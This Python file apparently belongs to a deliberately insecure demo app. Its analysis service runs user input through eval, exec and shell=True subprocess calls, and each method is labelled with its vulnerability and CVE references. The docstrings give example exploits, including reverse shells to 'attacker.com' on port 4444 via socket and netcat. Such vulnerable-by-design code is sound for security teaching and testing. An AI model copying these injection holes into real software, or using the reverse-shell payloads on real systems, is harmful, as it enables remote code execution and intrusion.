"""Analysis service with RCE vulnerabilities

VULNERABILITIES:
- eval/exec for data analysis
- Unsafe code execution
- No sandboxing
"""

import subprocess
import sys
from io import StringIO


class AnalysisService:
    """Data analysis - DELIBERATELY INSECURE"""
    
    @staticmethod
    def evaluate_expression(expr, data=None):
        """VULN: RCE via eval for data analysis
        CVE Reference: CVE-2023-6019 (Ray OS command injection), CVE-2025-0868 (DocsGPT RCE)
        
        Exploit: expr='__import__("os").system("whoami")'
        """
        context = {'data': data} if data else {}
        try:
            # VULN: eval allows arbitrary code execution
            result = eval(expr, {"__builtins__": __builtins__}, context)
            return {"success": True, "result": str(result)}
        except Exception as e:
            # VULN: Info disclosure via error messages
            return {"success": False, "error": str(e), "traceback": str(e.__traceback__)}
    
    @staticmethod
    def execute_analysis(code, data=None):
        """VULN: RCE via exec
        CVE Reference: CVE-2024-42845 (Invesalius3), CVE-2025-1550 (Keras RCE)
        
        Exploit: code='import socket; s=socket.socket(); s.connect(("attacker.com", 4444)); ...'
        """
        output_buffer = StringIO()
        old_stdout = sys.stdout
        sys.stdout = output_buffer
        
        context = {'data': data} if data else {}
        
        try:
            # VULN: exec allows arbitrary code execution
            exec(code, {"__builtins__": __builtins__}, context)
            sys.stdout = old_stdout
            return {"success": True, "output": output_buffer.getvalue()}
        except Exception as e:
            sys.stdout = old_stdout
            # VULN: Info disclosure
            return {"success": False, "error": str(e)}
    
    @staticmethod
    def run_script(script_path, args=[]):
        """VULN: Command injection via script execution
        CVE Reference: CVE-2025-1550 (Keras RCE), CVE-2024-11392 (HuggingFace RCE)
        
        Exploit: script_path='/tmp/evil.py; nc attacker.com 4444 -e /bin/sh #'
        """
        try:
            # VULN: Command injection
            cmd = f"python3 {script_path} {' '.join(args)}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return {
                "success": result.returncode == 0,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Timeout"}
        except Exception as e:
            # VULN: Info disclosure
            return {"success": False, "error": str(e)}
    
    @staticmethod
    def statistical_analysis(dataset, formula):
        """VULN: Formula injection via eval
        CVE Reference: CVE-2024-23346 (Pymatgen RCE)
        
        Exploit: formula='exec("import os; os.system(\'id\')")'
        """
        try:
            # VULN: eval on user-provided formula
            result = eval(f"lambda data: {formula}")(dataset)
            return {"success": True, "result": result}
        except Exception as e:
            return {"success": False, "error": str(e)}
